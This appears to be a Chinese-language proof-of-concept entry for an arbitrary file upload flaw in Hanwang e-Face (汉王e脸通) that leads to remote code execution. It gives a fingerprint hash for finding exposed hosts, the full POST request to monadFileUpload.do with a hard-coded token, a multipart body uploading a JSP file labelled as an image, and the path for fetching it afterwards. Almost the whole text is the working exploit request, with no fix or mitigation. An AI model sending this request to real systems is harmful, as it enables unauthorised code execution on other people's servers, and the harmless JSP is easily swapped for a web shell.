# 汉王e脸通monadFileUpload.do存在任意文件上传导致rce漏洞

- **系统**：汉王e脸通　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`icon_hash="1380907357"`
- **请求**：`POST /manage/leaveList/monadFileUpload.do?recoToken=67mds2pxXQb&type= HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlA…`

**请求体 / payload**
```
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: image/jpeg
<% out.print("Hello World!"); %>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
GET /manage/resource/{obj}.jsp HTTP/1.1
```
- **预期**：200　|　—